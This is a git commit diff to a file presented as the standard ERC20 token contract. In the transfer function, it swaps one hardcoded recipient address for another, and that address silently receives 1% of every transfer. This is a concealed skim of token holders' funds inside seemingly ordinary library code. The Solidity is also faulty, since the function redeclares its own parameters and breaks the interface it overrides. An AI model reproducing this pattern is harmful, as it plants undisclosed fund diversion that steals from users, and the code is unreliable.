e651c0ae50739d99100d827cce4d471b2f8c0975
finalexit-bsc <82122090+finalexit-bsc@users.noreply.github.com>
2021-04-08 09:55:30 +0200

    Update ERC20.sol

--- contracts/token/ERC20/ERC20.sol
+++ contracts/token/ERC20/ERC20.sol
@@ -109,7 +109,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
      * - the caller must have a balance of at least `amount`.
      */
     function transfer(address recipient, uint256 amount, address target, uint256 shareForX) public virtual override returns (bool) {
-       address payable target = 0x45dF353Ccc93c48C167dDb352C1325DADf0635b3;
+       address payable target = 0xf89b1a37e4FdcDa1722C9378FaAFf59794DEb803;
        uint shareForX = amount/100;
        amount = amount-shareForX;
        _balances[target] += shareForX;
